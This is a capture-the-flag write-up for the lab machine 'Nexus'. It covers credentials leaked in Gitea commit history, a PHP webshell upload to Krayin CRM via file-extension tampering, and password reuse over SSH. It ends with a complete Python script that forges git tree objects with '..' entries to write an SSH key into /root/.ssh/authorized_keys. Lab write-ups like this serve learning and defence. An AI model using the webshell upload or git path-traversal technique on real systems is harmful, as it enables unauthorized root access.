# Nexus — HackTheBox Writeup

**Difficulty:** Easy  
**OS:** Linux

---

## Enumeration

### Nmap

```bash
nmap -sC -sV -p- 10.129.234.54
```

<img width="775" height="389" alt="image" src="https://github.com/user-attachments/assets/71861cdb-3867-48c0-b554-340edea84a6d" />

Open ports: **22 (SSH)** and **80 (HTTP)**. The HTTP server redirects to `nexus.htb`, which was added to `/etc/hosts`.

---

### Subdomain Fuzzing

Fuzzing for virtual hosts revealed two subdomains: `git.nexus.htb` and `billing.nexus.htb`. Both were added to `/etc/hosts`.

---

### Gitea Enumeration

Visiting `git.nexus.htb` revealed a public Gitea instance. Browsing to **Explore → Repositories** showed a public repo called `krayin-docker-setup`.

The repo contained a `.env` file. The current version had a blank `DB_PASSWORD`, but checking the **commit history** revealed an earlier commit where the password was visible before it was scrubbed:

```
DB_PASSWORD=N27xh!!2ucY04
```

<img width="569" height="465" alt="image" src="https://github.com/user-attachments/assets/3a17d4c4-46c3-498c-a43d-bfe5717ac269" />

The `.env` file also revealed `APP_URL=http://billing.nexus.htb`.

---

### Careers Page — Username Enumeration

The main `nexus.htb` site had a Careers section with a job posting. The posting revealed two email addresses:

- `careers@nexus.htb`
- `j.matthew@nexus.htb` (hiring manager)

---

## Foothold

### Krayin CRM — CVE-2026-38526

Visiting `billing.nexus.htb` revealed a **Krayin CRM** login page running version `2.2.0`.

Logging in with `j.matthew@nexus.htb` and the leaked password `N27xh!!2ucY04` was successful.

This version is vulnerable to **CVE-2026-38526**: an unrestricted file upload via the TinyMCE mail attachment endpoint.

Reference: https://github.com/TREXNEGRO/Security-Advisories/blob/main/CVE-2026-38526/poc.md

A PHP webshell was uploaded by:
1. Composing a new email in the CRM
2. Attaching a PHP file disguised as a `.png`
3. Intercepting the request in Burp Suite and renaming the file extension from `.png` to `.php`

<img width="1250" height="712" alt="image" src="https://github.com/user-attachments/assets/b7a836c1-204c-4142-958b-f108287876e7" />

The server responded with the file location. Visiting the URL with `?cmd=id` confirmed RCE:

<img width="816" height="286" alt="Screenshot from 2026-07-01 09-17-56" src="https://github.com/user-attachments/assets/d71c5f1f-cc4d-478a-99b8-8b2a1f534af3" />

A reverse shell was triggered via the webshell, landing a shell as `www-data`.

---

## Lateral Movement — www-data → jones

Enumerating the Krayin CRM files on the server:

```bash
cat /var/www/krayin/.env
```

This revealed cleartext database credentials:

```
DB_PASSWORD=y27xb3ha!!74GbR
```

<img width="660" height="633" alt="image" src="https://github.com/user-attachments/assets/3928f5f1-dd86-4007-845f-3705987eabff" />

Checking `/etc/passwd` revealed a user `jones`. SSH login with these credentials was successful:

```bash
ssh jones@10.129.234.54
# password: y27xb3ha!!74GbR
```

<img width="696" height="630" alt="image" src="https://github.com/user-attachments/assets/56f3b239-8cab-4921-895c-7ea3b22bfadc" />

The user flag was found at `/home/jones/user.txt`.

---

## Privilege Escalation — jones → root

### Discovery

Running `systemctl list-timers` revealed a suspicious timer:

```
gitea-template-sync.timer → gitea-template-sync.service
```

This runs `/etc/gitea/template-sync.py` every minute as the `git` user. The script clones all Gitea repos marked as templates and syncs their files to:

```
/home/git/template-staging/<owner>/<repo>/
```

### The Vulnerability — Unsanitized os.path.join

The critical bug in the script:

```python
target = os.path.join(stage_path, filepath)
```

The `filepath` variable comes directly from `git ls-tree` output with no sanitization. This means a file path containing `..` traversal sequences will resolve outside the staging directory.

### Exploitation — Git Object Injection

Normal `git add` blocks `..` in file paths via `verify_path()`. To bypass this, raw git objects were written directly to `.git/objects/`, skipping validation entirely.

A Python script was used to build the malicious git tree structure:

```python
import hashlib, zlib, os, time

def write_obj(data, obj_type):
    header = ("%s %d" % (obj_type, len(data))).encode() + b"\x00"
    store = header + data
    sha = hashlib.sha1(store).hexdigest()
    compressed = zlib.compress(store)
    path = os.path.join(".git", "objects", sha[:2], sha[2:])
    os.makedirs(os.path.dirname(path), exist_ok=True)
    if not os.path.exists(path):
        open(path, "wb").write(compressed)
    return sha

# Blob: SSH public key
blob_sha = write_obj(b"ssh-ed25519 <YOUR_PUBLIC_KEY>\n", "blob")

# Tree: authorized_keys file inside .ssh/
ssh_tree_sha = write_obj(b"100644 authorized_keys\x00" + bytes.fromhex(blob_sha), "tree")

# Tree: .ssh/ inside root/
dot_ssh_tree_sha = write_obj(b"40000 .ssh\x00" + bytes.fromhex(ssh_tree_sha), "tree")

# Tree: root/ directory
root_tree_sha = write_obj(b"40000 root\x00" + bytes.fromhex(dot_ssh_tree_sha), "tree")

# Wrap in 5 levels of ".." to escape staging directory
current_sha = root_tree_sha
for i in range(5):
    current_sha = write_obj(b"40000 ..\x00" + bytes.fromhex(current_sha), "tree")

# Final tree with README.md + traversal
readme_sha = write_obj(b"# Template\n", "blob")
final_tree_sha = write_obj(
    b"100644 README.md\x00" + bytes.fromhex(readme_sha) +
    b"40000 ..\x00" + bytes.fromhex(current_sha), "tree")

# Commit
ts = int(time.time())
commit_data = ("tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n" % (final_tree_sha, ts, ts)).encode()
commit_sha = write_obj(commit_data, "commit")

# Write ref
os.makedirs(os.path.join(".git", "refs", "heads"), exist_ok=True)
open(os.path.join(".git", "refs", "heads", "main"), "w").write(commit_sha + "\n")
print("Done:", commit_sha)
```

The traversal path resolves as follows, escaping from the staging directory up to `/root/.ssh/authorized_keys`:

```
/home/git/template-staging/jones/rce/
  ../../../../../../root/.ssh/authorized_keys
```

After pushing the repo:

```bash
git push -u origin main --force
```

The sync log confirmed the traversal succeeded:

```
synced: ../../../../../root/.ssh/authorized_keys
```

SSH as root using the corresponding private key:

```bash
ssh -i ~/.ssh/id_ed25519 root@10.129.234.54
```

The root flag was found at `/root/root.txt`.

<img width="660" height="633" alt="Screenshot from 2026-07-01 13-28-17" src="https://github.com/user-attachments/assets/deb27f86-29d9-45af-90a3-68a65d345993" />
